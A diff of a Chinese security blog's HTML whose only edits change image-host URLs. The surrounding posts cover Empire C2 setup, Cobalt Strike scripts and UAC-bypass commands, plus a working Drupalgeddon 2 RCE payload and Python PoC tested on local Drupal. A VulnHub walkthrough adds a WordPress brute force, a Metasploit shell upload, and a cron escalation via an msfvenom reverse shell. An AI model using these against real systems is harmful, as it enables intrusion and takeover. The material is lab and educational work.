@@ -345,28 +345,28 @@
 <h5 id="一篇文章精通PowerShell-Empire-2-3（上）"><a href="#一篇文章精通PowerShell-Empire-2-3（上）" class="headerlink" title="一篇文章精通PowerShell Empire 2.3（上）"></a>一篇文章精通PowerShell Empire 2.3（上）</h5><p><a href="https://www.anquanke.com/post/id/87328" target="_blank" rel="noopener">https://www.anquanke.com/post/id/87328</a></p>
 <h5 id="一篇文章精通PowerShell-Empire-2-3（下）"><a href="#一篇文章精通PowerShell-Empire-2-3（下）" class="headerlink" title="一篇文章精通PowerShell Empire 2.3（下）"></a>一篇文章精通PowerShell Empire 2.3（下）</h5><p><a href="https://www.anquanke.com/post/id/87333" target="_blank" rel="noopener">https://www.anquanke.com/post/id/87333</a></p>
 <p>如下安装命令，官方提供了一键脚本，linux下kali与ubuntu都是支持的。项目原理是类似Metasploit、先建立Listeners，这里话简单看一写它的架构。</p>
-<p><img src="http://wfwewefw.yuxuni.cn/myimages/20181202/UqKswX6rtV34.png?imageslim" alt="mark"></p>
+<p><img src="http://pn5jn1i1e.bkt.clouddn.com/myimages/20181202/UqKswX6rtV34.png?imageslim" alt="mark"></p>
 <p>​    安装很简单，apt下载些包，pip安装python依赖。自动安装，最后需要设置数据库密码。也可以用data，目录下的rest.sh重置数据库。项目结构很清晰。</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/EmpireProject/Empire.git</span><br><span class="line"></span><br><span class="line">cd Empire</span><br><span class="line"></span><br><span class="line">cd setup</span><br><span class="line"></span><br><span class="line">sudo ./install.sh</span><br><span class="line"></span><br><span class="line">python empire --rest --username admin --password password</span><br></pre></td></tr></table></figure>
 <p>启动  开启1337端口，rest api。</p>
-<p><img src="http://wfwewefw.yuxuni.cn/myimages/20181202/nrz5mH5Ah9Kl.png?imageslim" alt="mark"></p>
+<p><img src="http://pn5jn1i1e.bkt.clouddn.com/myimages/20181202/nrz5mH5Ah9Kl.png?imageslim" alt="mark"></p>
 <h5 id="常用命令-直接help"><a href="#常用命令-直接help" class="headerlink" title="常用命令  直接help"></a>常用命令  直接help</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">listenters</span><br><span class="line">help</span><br></pre></td></tr></table></figure>
 <p>​    这里的module，分python版和powershell，不用多说啦，powershell只是用在windows平台下面，modules下面的文件只是python入口文件最后调用的还是data文件夹下面的powershell payload。python版的用在，linux与osx下面。大概分为下面几个大类。需要看到的时候在help就可以了。</p>
 <h4 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h4><blockquote>
 <p><a href="https://github.com/SadProcessor/Cheats/blob/master/RedTrooperFM.md" target="_blank" rel="noopener">https://github.com/SadProcessor/Cheats/blob/master/RedTrooperFM.md</a></p>
 </blockquote>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">code_execution	代码执行</span><br><span class="line">collection		信息收集</span><br><span class="line">credentials		凭证	</span><br><span class="line">exfiltration	数据窃取</span><br><span class="line">exploitation</span><br><span class="line">lateral_movement 横向</span><br><span class="line">management		管理</span><br><span class="line">persistence		权限维持</span><br><span class="line">privesc		提权</span><br><span class="line">recon		侦查</span><br><span class="line">situational_awareness</span><br><span class="line">trollsploit</span><br></pre></td></tr></table></figure>
-<p><img src="http://wfwewefw.yuxuni.cn/myimages/20181202/558WMKnNVaYQ.png?imageslim" alt="mark"></p>
+<p><img src="http://pn5jn1i1e.bkt.clouddn.com/myimages/20181202/558WMKnNVaYQ.png?imageslim" alt="mark"></p>
 <p>usestager</p>
-<p><img src="http://wfwewefw.yuxuni.cn/myimages/20181202/zwIq1GaC13ke.png?imageslim" alt="mark"></p>
-<p><img src="http://wfwewefw.yuxuni.cn/myimages/20181202/IlOV34AFS20x.png?imageslim" alt="mark"></p>
+<p><img src="http://pn5jn1i1e.bkt.clouddn.com/myimages/20181202/zwIq1GaC13ke.png?imageslim" alt="mark"></p>
+<p><img src="http://pn5jn1i1e.bkt.clouddn.com/myimages/20181202/IlOV34AFS20x.png?imageslim" alt="mark"></p>
 <p>​    </p>
 <p>​    用Base64解码。看到发送的Python payload，大概的原理是客户端先判断有没有Little Snitch，直接用python2中原生urllib2库请求我们Empire 的http listener，的ip地址端口，这里的listener是由flask提供server，验证客户端来的cookie，相当于模拟正常的web流量。加密混淆建立个长连接。同样Powershell也这个原理。</p>
-<p><img src="http://wfwewefw.yuxuni.cn/myimages/20181202/59MxERtRsAzf.png?imageslim" alt="mark"></p>
+<p><img src="http://pn5jn1i1e.bkt.clouddn.com/myimages/20181202/59MxERtRsAzf.png?imageslim" alt="mark"></p>
 <p>payload执行后，还要rm。</p>
-<p><img src="http://wfwewefw.yuxuni.cn/myimages/20181202/wrfQjtc5bam7.png?imageslim" alt="mark"></p>
+<p><img src="http://pn5jn1i1e.bkt.clouddn.com/myimages/20181202/wrfQjtc5bam7.png?imageslim" alt="mark"></p>
 <p>客户端执行后，agent上线。</p>
-<p><img src="http://wfwewefw.yuxuni.cn/myimages/20181202/FobbiBWwAvyX.png?imageslim" alt="mark"></p>
+<p><img src="http://pn5jn1i1e.bkt.clouddn.com/myimages/20181202/FobbiBWwAvyX.png?imageslim" alt="mark"></p>
 <p>接下来就可以进行后渗透攻击。</p>
 <h3 id="PSattack：一个渗透测试中使用的万能框架"><a href="#PSattack：一个渗透测试中使用的万能框架" class="headerlink" title="PSattack：一个渗透测试中使用的万能框架"></a>PSattack：一个渗透测试中使用的万能框架</h3><h3 id="CrackMapExec"><a href="#CrackMapExec" class="headerlink" title="CrackMapExec"></a>CrackMapExec</h3><blockquote>
 <p><a href="https://github.com/byt3bl33d3r/CrackMapExec" target="_blank" rel="noopener">https://github.com/byt3bl33d3r/CrackMapExec</a></p>
@@ -403,8 +403,8 @@
 <p>后续有时间再整理整理。</p>
 </blockquote>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">CertUtilWebDelivery.cna  </span><br><span class="line">Logging                       </span><br><span class="line">PowerLessShell        </span><br><span class="line">ProcessMonitor.ps1  </span><br><span class="line">SMBPayloadGenerator.cna</span><br><span class="line">ArtifactPayloadGenerator.cna </span><br><span class="line">DriverSearcher           </span><br><span class="line">logvis.cna                    </span><br><span class="line">PowerView3-Aggressor  </span><br><span class="line">UACBypass</span><br><span class="line">AVQuery.cna                   </span><br><span class="line">EDR.cna                  </span><br><span class="line">Persistence                   </span><br><span class="line">ProcessColor.cna     </span><br><span class="line">RedTeamRepo.cna     </span><br><span class="line">Beaconpire                    </span><br><span class="line">ElevateKit               </span><br><span class="line">persistence-aggressor-script  </span><br><span class="line">ProcessMonitor.cna    </span><br><span class="line">silver-tickets.cna</span><br></pre></td></tr></table></figure>
-<p><img src="http://wfwewefw.yuxuni.cn/myimages/20181202/4WR9tTEc46Wr.png?imageslim" alt="mark"></p>
-<p><img src="http://wfwewefw.yuxuni.cn/myimages/20181202/0nCBot3LSOtW.png?imageslim" alt="mark"></p>
+<p><img src="http://pn5jn1i1e.bkt.clouddn.com/myimages/20181202/4WR9tTEc46Wr.png?imageslim" alt="mark"></p>
+<p><img src="http://pn5jn1i1e.bkt.clouddn.com/myimages/20181202/0nCBot3LSOtW.png?imageslim" alt="mark"></p>
 <ul>
 <li><p>ArtifactPayloadGenerator.cna</p>
 <ul>
@@ -602,14 +602,14 @@
 </ul>
 <p>1、扫描可以提权的uac列表，绿色是可以提权的payload。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python  winpwnage.py -scan  -uac</span><br></pre></td></tr></table></figure>
-<p><img src="http://wfwewefw.yuxuni.cn/myimages/20181203/dER5wL6wIqnI.png?imageslim" alt="mark"></p>
+<p><img src="http://pn5jn1i1e.bkt.clouddn.com/myimages/20181203/dER5wL6wIqnI.png?imageslim" alt="mark"></p>
 <p>2、扫描可以权限维持的persist列表，绿色是可以提权的payload。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python  winpwnage.py -scan  -persist</span><br></pre></td></tr></table></figure>
-<p><img src="http://wfwewefw.yuxuni.cn/myimages/20181203/fnOHIfb9jyJO.png?imageslim" alt="mark"></p>
+<p><img src="http://pn5jn1i1e.bkt.clouddn.com/myimages/20181203/fnOHIfb9jyJO.png?imageslim" alt="mark"></p>
 <pre><code>python  winpwnage.py    -use  -uac ID号 C:\Windows\System32\cmd.exe
-</code></pre><p><img src="http://wfwewefw.yuxuni.cn/myimages/20181203/lkvggvnySPdd.png?imageslim" alt="mark"></p>
+</code></pre><p><img src="http://pn5jn1i1e.bkt.clouddn.com/myimages/20181203/lkvggvnySPdd.png?imageslim" alt="mark"></p>
 <p>3、弹出管理员cmd.exe</p>
-<p><img src="http://wfwewefw.yuxuni.cn/myimages/20181203/vC5HeUcUtu5b.png?imageslim" alt="mark"></p>
+<p><img src="http://pn5jn1i1e.bkt.clouddn.com/myimages/20181203/vC5HeUcUtu5b.png?imageslim" alt="mark"></p>
 <h5 id="pupy"><a href="#pupy" class="headerlink" title="pupy"></a>pupy</h5><blockquote>
 <p>开源远控</p>
 </blockquote>
@@ -897,9 +897,9 @@
 <p><code>buildform</code>用户可控，可以传入<code>mail[#post_render]</code>、<code>mail[#type]数组，</code>即用户注入。而后<code>uploadAjaxCallback</code>方法可解析上面的数组，<code>call_user_fun</code>对于对于部分<code>#</code>属性数组值处理，导致任意代码执行。当做元素解析。导致远程代码执行漏洞。</p>
 <p>在Drupal中render方法里<code>#pre_render</code>在render之前操作数组，<code>#post_render</code>接收render的结果并在其添加包装，<code>#lazy_builder</code>用于在render过程的最后添加元素。</p>
 <p>我们来调试 一下：</p>
-<p><img src="http://pn49yk1z4.bkt.clouddn.com/180414/aiIJfk2BBg.png?imageslim" alt="mark"></p>
+<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180414/aiIJfk2BBg.png?imageslim" alt="mark"></p>
 <p>如图可以看出 数组 成功变为元素解析。</p>
-<p><img src="http://pn49yk1z4.bkt.clouddn.com/180414/Ak6aJccKdA.png?imageslim" alt="mark"></p>
+<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180414/Ak6aJccKdA.png?imageslim" alt="mark"></p>
 <p>这样我们就可以通过构造mail[#post_render]形式的数组进行攻击。</p>
 <h2 id="0X01漏洞复现"><a href="#0X01漏洞复现" class="headerlink" title="0X01漏洞复现"></a>0X01漏洞复现</h2><p><strong>对于较新的版本。在本地复现成功：Drupal8.5.0，Drupal8.4.5，Drupal8.4.4，Drupal8.4.3；</strong> 通杀EXP！</p>
 <p>安装 Drupal8.5.0：额Drupal 带翻译可以在线下载。</p>
@@ -907,17 +907,17 @@
 <p>Drupal8.4.4</p>
 <p><a href="https://ftp.drupal.org/files/projects/drupal-8.4.4.tar.gz" target="_blank" rel="noopener">https://ftp.drupal.org/files/projects/drupal-8.4.4.tar.gz</a></p>
 <p>。。。 这样一看下载地址很清楚。</p>
-<p><img src="http://pn49yk1z4.bkt.clouddn.com/180413/hmIeacF69f.png?imageslim" alt="mark"></p>
+<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180413/hmIeacF69f.png?imageslim" alt="mark"></p>
 <p><strong>payload:</strong></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/drupal-8.5.0/user/register?element_parents=account/mail/%23value&amp;ajax_form=1&amp;_wrapper_format=drupal_ajax</span><br></pre></td></tr></table></figure>
 <p>post 内容：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&apos;mail[a][#lazy_builder][0]&apos;: &apos;system&apos;,</span><br><span class="line">&apos;mail[a][#lazy_builder][1][]&apos;: &apos;whoami&apos;,</span><br><span class="line">&apos;form_id&apos;: &apos;user_register_form&apos;</span><br></pre></td></tr></table></figure>
-<p><img src="http://pn49yk1z4.bkt.clouddn.com/180414/DDbh1kilFh.png?imageslim" alt="mark"></p>
+<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180414/DDbh1kilFh.png?imageslim" alt="mark"></p>
 <p>Python 小脚本<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://localhost/drupal-8.5.0/'</span></span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">'mail[test][#lazy_builder][0]'</span>: <span class="string">'system'</span>,</span><br><span class="line">    <span class="string">'mail[test][#lazy_builder][1][]'</span>: <span class="string">'whoami'</span>,</span><br><span class="line">    <span class="string">'form_id'</span>: <span class="string">'user_register_form'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">target = url + <span class="string">'user/register?element_parents=account/mail/%23value&amp;ajax_form=1&amp;_wrapper_format=drupal_ajax'</span></span><br><span class="line">r = requests.post(target, data=payload, verify=<span class="keyword">False</span>)</span><br><span class="line">print(r.headers)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure></p>
-<h4 id="本地-Drupal8-5-0-复现成功"><a href="#本地-Drupal8-5-0-复现成功" class="headerlink" title="本地 Drupal8.5.0 复现成功"></a>本地 Drupal8.5.0 复现成功</h4><p><img src="http://pn49yk1z4.bkt.clouddn.com/180414/ChG2AhK1B1.png?imageslim" alt="mark"></p>
-<h4 id="本地Drupal8-4-5-复现成功"><a href="#本地Drupal8-4-5-复现成功" class="headerlink" title="本地Drupal8.4.5 复现成功"></a>本地Drupal8.4.5 复现成功</h4><p><img src="http://pn49yk1z4.bkt.clouddn.com/180414/fC5Jb5Bmg0.png?imageslim" alt="mark"></p>
-<h4 id="本地Drupal8-4-4-复现成功"><a href="#本地Drupal8-4-4-复现成功" class="headerlink" title="本地Drupal8.4.4 复现成功"></a>本地Drupal8.4.4 复现成功</h4><p><img src="http://pn49yk1z4.bkt.clouddn.com/180414/LfgeE8fhbI.png?imageslim" alt="mark"></p>
-<h4 id="本地Drupal8-4-3复现成功"><a href="#本地Drupal8-4-3复现成功" class="headerlink" title="本地Drupal8.4.3复现成功"></a>本地Drupal8.4.3复现成功</h4><p><img src="http://pn49yk1z4.bkt.clouddn.com/180414/KEce6hkfam.png?imageslim" alt="mark"></p>
+<h4 id="本地-Drupal8-5-0-复现成功"><a href="#本地-Drupal8-5-0-复现成功" class="headerlink" title="本地 Drupal8.5.0 复现成功"></a>本地 Drupal8.5.0 复现成功</h4><p><img src="http://pn5jn1i1e.bkt.clouddn.com/180414/ChG2AhK1B1.png?imageslim" alt="mark"></p>
+<h4 id="本地Drupal8-4-5-复现成功"><a href="#本地Drupal8-4-5-复现成功" class="headerlink" title="本地Drupal8.4.5 复现成功"></a>本地Drupal8.4.5 复现成功</h4><p><img src="http://pn5jn1i1e.bkt.clouddn.com/180414/fC5Jb5Bmg0.png?imageslim" alt="mark"></p>
+<h4 id="本地Drupal8-4-4-复现成功"><a href="#本地Drupal8-4-4-复现成功" class="headerlink" title="本地Drupal8.4.4 复现成功"></a>本地Drupal8.4.4 复现成功</h4><p><img src="http://pn5jn1i1e.bkt.clouddn.com/180414/LfgeE8fhbI.png?imageslim" alt="mark"></p>
+<h4 id="本地Drupal8-4-3复现成功"><a href="#本地Drupal8-4-3复现成功" class="headerlink" title="本地Drupal8.4.3复现成功"></a>本地Drupal8.4.3复现成功</h4><p><img src="http://pn5jn1i1e.bkt.clouddn.com/180414/KEce6hkfam.png?imageslim" alt="mark"></p>
 <h2 id="0X02-参考"><a href="#0X02-参考" class="headerlink" title="0X02 参考"></a>0X02 参考</h2><p><a href="https://research.checkpoint.com/uncovering-drupalgeddon-2/" target="_blank" rel="noopener">https://research.checkpoint.com/uncovering-drupalgeddon-2/</a></p>
 <p><a href="https://paper.seebug.org/567/" target="_blank" rel="noopener">https://paper.seebug.org/567/</a> </p>
 
@@ -979,7 +979,7 @@
 <p>域控制器会注册一个srv记录，因此可以通过使用nslookup来查询这个srv记录，定位域控制器。</p>
 <p>交互式命令：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nslookup                             # 进入交互式界面</span><br><span class="line"></span><br><span class="line">set type=all                     # 设置记录类型，可以设置为srv</span><br><span class="line"></span><br><span class="line">ldap.tcp.dc._msdcs.exist.local    # 执行查询</span><br></pre></td></tr></table></figure>
-<p><img src="http://pn49yk1z4.bkt.clouddn.com/181027/889FJF18ie.png?imageslim" alt="mark"></p>
+<p><img src="http://pn5jn1i1e.bkt.clouddn.com/181027/889FJF18ie.png?imageslim" alt="mark"></p>
 <p>nslookup输出</p>
 <p>nslookup</p>
 <p>输出：</p>
@@ -1180,29 +1180,29 @@
 <p> <a href="https://www.vulnhub.com/" target="_blank" rel="noopener">https://www.vulnhub.com/</a></p>
 <h3 id="0X01-BSides-Vancouver-2018-Workshop）"><a href="#0X01-BSides-Vancouver-2018-Workshop）" class="headerlink" title="0X01 BSides Vancouver: 2018 (Workshop）"></a>0X01 BSides Vancouver: 2018 (Workshop）</h3><p>下载地址：<a href="https://www.vulnhub.com/entry/bsides-vancouver-2018-workshop,231/" target="_blank" rel="noopener">BSides Vancouver: 2018 (Workshop) ~ VulnHub</a>，可使用种子下载，速度较快。</p>
 <p>下载的VOA文件可用VirtualBox或者VMware Workstation导入使用。配置靶机的网络启动即可。</p>
-<p><img src="http://pn49yk1z4.bkt.clouddn.com/180408/i9B8e6fmjH.png?imageslim" alt="mark"></p>
+<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180408/i9B8e6fmjH.png?imageslim" alt="mark"></p>
 <h4 id="信息收集："><a href="#信息收集：" class="headerlink" title="信息收集："></a>信息收集：</h4><p>老规矩先扫描，可以看到 存在FTP Anonymous访问访问漏洞，</p>
 <p>nbtscan 192.168.1.1/24<br>nmap -A 192.168.1.32</p>
-<p><img src="http://pn49yk1z4.bkt.clouddn.com/180408/JB1kilHHKA.png?imageslim" alt="mark"></p>
-<p><img src="http://pn49yk1z4.bkt.clouddn.com/180408/HIGAGlgfBg.png?imageslim" alt="mark"></p>
+<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180408/JB1kilHHKA.png?imageslim" alt="mark"></p>
+<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180408/HIGAGlgfBg.png?imageslim" alt="mark"></p>
 <p>下载 users.txt.bk  得到用户名</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">abatchy</span><br><span class="line">john</span><br><span class="line">mai</span><br><span class="line">anne</span><br><span class="line">doomguy</span><br></pre></td></tr></table></figure>
 <h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>wpscan -u  <a href="http://192.168.1.32/backup_wordpress/" target="_blank" rel="noopener">http://192.168.1.32/backup_wordpress/</a><br>wpscan -u <a href="http://192.168.1.32/backup_wordpress" target="_blank" rel="noopener">http://192.168.1.32/backup_wordpress</a> -username john –wordlist /usr/share/wordlists/rockyou.txt</p>
 <p>利用 wp_admin_shell_upload 漏洞</p>
-<p><img src="http://pn49yk1z4.bkt.clouddn.com/180408/JcAIm6dheJ.png?imageslim" alt="mark"></p>
+<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180408/JcAIm6dheJ.png?imageslim" alt="mark"></p>
 <p>爆破  密码得到<strong>enigma</strong></p>
-<p><img src="http://pn49yk1z4.bkt.clouddn.com/180408/7cDAkaI4k2.png?imageslim" alt="mark"></p>
+<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180408/7cDAkaI4k2.png?imageslim" alt="mark"></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">use exploit/unix/webapp/wp_admin_shell_upload</span><br><span class="line"></span><br><span class="line">msf exploit(unix/webapp/wp_admin_shell_upload) &gt;set rhost 192.168.1.32</span><br><span class="line"></span><br><span class="line">msf exploit(unix/webapp/wp_admin_shell_upload) &gt;set targeturi /backup-wordpress</span><br><span class="line"></span><br><span class="line">msf exploit(unix/webapp/wp_admin_shell_upload) &gt;set username john</span><br><span class="line"></span><br><span class="line">msf exploit(unix/webapp/wp_admin_shell_upload) &gt;set password enigma</span><br><span class="line"></span><br><span class="line">msf exploit(unix/webapp/wp_admin_shell_upload) &gt;exploit</span><br></pre></td></tr></table></figure>
-<p><img src="http://pn49yk1z4.bkt.clouddn.com/180408/06F9iE18i8.png?imageslim" alt="mark"></p>
+<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180408/06F9iE18i8.png?imageslim" alt="mark"></p>
 <h4 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h4><p>但是没有root权限，下一步需要提权。</p>
 <p>一般来说 linux提权可以使用用exp提权，或者通过计划任务、SUID文件属性进行提权。这里使用计划任务，查看root用户执行的计划任务。<code>cat crontab</code> ，把远控脚本写入<code>/usr/local/bin/cleanup</code>中，执行，用nc反向连接。</p>
-<p><img src="http://pn49yk1z4.bkt.clouddn.com/180408/m1Dd6iDll7.png?imageslim" alt="mark"></p>
+<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180408/m1Dd6iDll7.png?imageslim" alt="mark"></p>
 <p>msfvenom -p cmd / unix / reverse_python lhost = 192.168.1.63 lport = 9866 R  #msfveom 生成python后门 </p>
-<p><img src="http://pn49yk1z4.bkt.clouddn.com/180408/gH8j7iE1g0.png?imageslim" alt="mark"></p>
+<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180408/gH8j7iE1g0.png?imageslim" alt="mark"></p>
 <p>上传python远控木马</p>
-<p><img src="http://pn49yk1z4.bkt.clouddn.com/180408/94DA1fGGIF.png?imageslim" alt="mark"></p>
+<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180408/94DA1fGGIF.png?imageslim" alt="mark"></p>
 <p>nc -lvp 9866   # nc 反向监听</p>
-<p><img src="http://pn49yk1z4.bkt.clouddn.com/180408/9B8FblBjD4.png?imageslim" alt="mark"></p>
+<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180408/9B8FblBjD4.png?imageslim" alt="mark"></p>
 <h3 id="0X02-总结"><a href="#0X02-总结" class="headerlink" title="0X02 总结"></a>0X02 总结</h3><p>通过对以上靶机进行渗透测试，可以看出Vulnhub 靶机平台的靶机镜像环境还是不错的，平台提供初中高级的靶机镜像、从Web安全到系统安全也可以。基本可以涵盖大部分的渗透测试流程，可以较为方便的实验测试靶机。</p>
 
       
